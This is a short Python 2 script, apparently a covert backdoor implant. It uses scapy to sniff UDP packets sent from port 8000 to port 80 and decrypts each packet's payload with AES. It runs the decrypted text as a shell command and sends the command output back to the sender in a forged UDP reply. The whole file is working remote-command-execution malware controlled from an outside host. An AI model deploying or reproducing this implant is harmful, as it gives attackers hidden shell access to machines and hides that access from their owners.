import sys, os, argparse, socket, subprocess, logging, time, subprocess
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from AesEncryption import *

FILTER = "udp and (dst port 80) and (src port 8000)"

def remoteExecute(pkt):
    print "==============================================="
    command = decrypt(pkt['Raw'].load)
    print command
    print "==============================================="

    variable = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    ouput = "\nOUTPUT:\n" + variable.stdout.read() + variable.stderr.read()

    pkt2 = IP(src=pkt["IP"].dst, dst=pkt["IP"].src)/UDP(dport=pkt['UDP'].sport,sport=pkt['UDP'].dport)/ouput
    print pkt2.show
    print "==============================================="
    time.sleep(0.5)
    send(pkt2)

def stopfilter(pkt):
    return True

def main():

    sniff(filter=FILTER, prn=remoteExecute)

if __name__ == '__main__':
    main()
